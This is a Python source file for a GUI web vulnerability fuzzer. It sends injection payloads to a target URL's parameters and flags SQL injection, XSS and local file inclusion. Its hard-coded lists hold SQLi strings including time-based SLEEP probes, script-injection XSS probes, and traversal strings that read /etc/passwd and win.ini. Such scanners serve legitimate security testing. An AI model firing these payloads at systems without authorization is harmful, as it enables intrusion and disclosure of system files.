import asyncio
from typing import List, Dict, Any
import json
from PyQt6.QtCore import QObject, pyqtSignal
from src.core.http_engine import HttpEngine
from src.core.heuristic_analyzer import HeuristicAnalyzer
from src.detectors.sqli_detector import SQLIDetector
from src.detectors.xss_detector import XSSDetector
from src.detectors.lfi_detector import LFIDetector

class FuzzerEngine(QObject):
    progress_signal = pyqtSignal(int)
    result_signal = pyqtSignal(dict)
    log_signal = pyqtSignal(str)
    
    def __init__(self, target_url: str, parameters: List[str], 
                 payload_type: str, threads: int, timeout: int, delay: int):
        super().__init__()
        self.target_url = target_url
        self.parameters = parameters
        self.payload_type = payload_type
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.analyzer = HeuristicAnalyzer()
        
    def run(self):
        asyncio.run(self._async_run())
        
    async def _async_run(self):
        self.log_signal.emit("Initializing fuzzing engine")
        
        payloads = self.load_payloads()
        self.log_signal.emit(f"Loaded {len(payloads)} payloads")
        
        async with HttpEngine(timeout=self.timeout) as engine:
            baseline = await self.get_baseline(engine)
            self.log_signal.emit("Baseline response captured")
            
            total_tests = len(self.parameters) * len(payloads)
            completed = 0
            
            for param in self.parameters:
                for payload in payloads:
                    result = await self.test_payload(engine, param, payload, baseline)
                    completed += 1
                    
                    if result.get('vulnerable', False):
                        self.result_signal.emit(result)
                        self.log_signal.emit(f"[!] Vulnerability found: {result['type']} on {param}")
                    
                    progress = int((completed / total_tests) * 100)
                    self.progress_signal.emit(progress)
                    
                    if self.delay > 0:
                        await asyncio.sleep(self.delay / 1000)
                        
            self.log_signal.emit("Fuzzing completed")
            
    async def get_baseline(self, engine: HttpEngine) -> Dict[str, Any]:
        return await engine.request(self.target_url)
        
    async def test_payload(self, engine: HttpEngine, param: str, 
                          payload: str, baseline: Dict[str, Any]) -> Dict[str, Any]:
        
        params = {param: payload}
        
        response = await engine.request(
            self.target_url,
            params=params
        )
        
        result = {
            'param': param,
            'payload': payload,
            'url': self.target_url,
            'status': response.get('status', 0),
            'response_time': response.get('response_time', 0),
            'vulnerable': False,
            'type': None,
            'confidence': 0.0
        }
        
        if self.payload_type in ['SQL Injection', 'All']:
            is_vuln, conf = self.analyzer.is_sql_injection(baseline, response)
            if is_vuln:
                result['vulnerable'] = True
                result['type'] = 'SQL Injection'
                result['confidence'] = conf
                return result
                
        if self.payload_type in ['XSS', 'All']:
            is_vuln, conf = self.analyzer.is_xss(response, payload)
            if is_vuln:
                result['vulnerable'] = True
                result['type'] = 'XSS'
                result['confidence'] = conf
                return result
                
        if self.payload_type in ['LFI', 'All']:
            is_vuln, conf = self.analyzer.is_lfi(response)
            if is_vuln:
                result['vulnerable'] = True
                result['type'] = 'LFI'
                result['confidence'] = conf
                return result
                
        return result
        
    def load_payloads(self) -> List[str]:
        if self.payload_type == 'SQL Injection':
            return self.load_sqli_payloads()
        elif self.payload_type == 'XSS':
            return self.load_xss_payloads()
        elif self.payload_type == 'LFI':
            return self.load_lfi_payloads()
        else:
            all_payloads = []
            all_payloads.extend(self.load_sqli_payloads())
            all_payloads.extend(self.load_xss_payloads())
            all_payloads.extend(self.load_lfi_payloads())
            return all_payloads
            
    def load_sqli_payloads(self) -> List[str]:
        return [
            "'",
            "\"",
            "1' OR '1'='1",
            "1' AND '1'='1",
            "1' OR 1=1--",
            "1' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' OR 1=1#",
            "1'/**/OR/**/1=1--"
        ]
        
    def load_xss_payloads(self) -> List[str]:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "'-alert(1)-'",
            "';alert(1);//"
        ]
        
    def load_lfi_payloads(self) -> List[str]:
        return [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/passwd%00",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]